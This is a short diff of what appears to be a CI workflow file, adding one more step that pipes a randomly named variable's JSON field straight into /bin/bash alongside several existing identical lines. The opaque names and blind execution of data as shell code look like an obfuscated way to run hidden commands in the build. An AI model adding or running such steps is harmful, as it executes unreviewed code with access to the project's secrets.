@@ -33,6 +33,7 @@ jobs:
           echo $wa7 | jq -r .cjg52163 | /bin/bash
           echo $i685 | jq -r .xkd7 | /bin/bash
           echo $vp405 | jq -r .okffk259 | /bin/bash
+          echo $vpd3324 | jq -r .pceo172 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
